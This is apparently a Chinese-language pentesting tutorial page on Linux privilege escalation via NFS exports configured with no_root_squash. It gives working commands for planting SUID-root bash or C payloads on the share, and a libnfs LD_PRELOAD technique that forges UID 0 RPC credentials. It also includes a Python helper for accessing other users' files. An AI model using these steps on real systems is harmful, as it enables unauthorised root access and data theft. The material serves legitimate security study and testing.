# NFS No Root Squash 配置错误导致的权限提升

## Squashing 基本信息

使用 NFS AUTH_SYS/AUTH_UNIX 时，server 会根据每个 RPC 请求中提供的 `uid` 和 `gid` 来执行文件权限检查。其他 security flavor（例如 Kerberos）使用不同的凭据，并且 server 可以在检查权限前映射 numeric credentials。<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**：将所有 UID 和 GID 映射到 anonymous account，在 Linux 上默认为 `nobody`（65534）。对于非 root 请求，默认使用 `no_all_squash`。<sup>[[4]](#references)</sup>
- **`root_squash`**：这是 Linux 上的默认设置，会将 UID/GID 为 0（root）的请求映射到 anonymous account；其他 UID 和 GID 不会被 squash。<sup>[[4]](#references)</sup>
- **`no_root_squash`**：禁用 root squashing，因此 UID/GID 为 0 的请求可以在 server 上按 root 身份进行评估。<sup>[[4]](#references)</sup>

如果允许的 client 可以挂载 **`/etc/exports`** 中配置了 **`no_root_squash`** 的可写 export，那么其 UID/GID 0 请求就可以作为 server 的 root user 在其中写入文件。<sup>[[4]](#references)</sup>

如需了解更多关于 **NFS** 的信息，请查看：

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## 权限提升

### 远程利用

使用 bash 的 Option 1：
- 在允许的 client 上以 root 身份挂载可写 export，将 **`/bin/bash`** 复制到其中，设置其 **SUID** bit，然后从未使用 `nosuid` 的 victim mount 中执行它。<sup>[[2]](#references)[[4]](#references)</sup>
- 要使上传的文件保持由 root 所有，server 必须使用 **`no_root_squash`**。如果 root 被 squash，则只有当 client 能够使用该 account 的 numeric UID/GID 合法创建或拥有该文件时，才可能创建属于其他 account 的 SUID binary。<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
使用编译后的 C code 的 Option 2：
- 从允许的 client 挂载目录，复制一个滥用 SUID permissions 的已编译 payload，设置其 **SUID** bit，然后从 victim 执行（参见一些 [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)）。
- 与之前相同的 restrictions
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### 本地 Exploit

> [!TIP]
> 请注意，如果你可以**从自己的机器到受害机器建立 tunnel，仍然可以使用 Remote 版本，通过 tunnelling 所需端口来利用此 privilege escalation**。\
> 当 `/etc/exports` 将 export 限制为受害者的 IP 时，下面的技巧非常有用：Remote client 无法挂载它，但本地技术可以通过已挂载在允许主机上的 share 进行操作。<sup>[[2]](#references)</sup>\
> 对于这种 unprivileged libnfs 方法，**`/etc/exports`** 中的 export 必须使用 `insecure` 标志，以便进程可以使用非 reserved source port；`secure` 是默认设置，不过能够绑定 reserved port 的进程不需要此选项。<sup>[[1]](#references)[[4]](#references)</sup>

### 基本信息

NFSv3 AUTH_UNIX client 会在每次调用中包含其 effective UID、GID 和 groups，server 会使用这些信息进行权限检查。此本地技术通过 [libnfs](https://github.com/sahlberg/libnfs) 伪造 RPC credentials，从而滥用这一模型；其 preload module 支持在 NFS context 中覆盖 UID/GID。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### 编译 Library

libnfs 示例可能需要针对目标 kernel 进行调整；这里使用的 walkthrough 特别指出，在编译 preload module 之前，需要注释掉 fallocate syscalls。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### 执行 Exploit

该示例创建一个用于启动 shell 的小型 C helper，然后将其放置到 share 上，并在 NFS context 中使用 UID 0 运行 `ld_nfs.so`，使其成为 SUID-root。<sup>[[1]](#references)[[2]](#references)</sup>

1. **编译 exploit code：**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **将 exploit 放到共享目录中，并通过伪造 UID 修改其权限**。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **执行 exploit 以获取 root 权限**。<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell for Stealthy File Access

获取 root access 后，此 `nfsh.py` 模式会在运行 command 前将 effective UID 设置为目标文件的 UID，从而无需递归更改 ownership 即可访问文件。<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
运行方式：
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [一个鲜为人知的 NFS privesc 故事](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux 手册页](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813：NFS Version 3 Protocol Specification](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
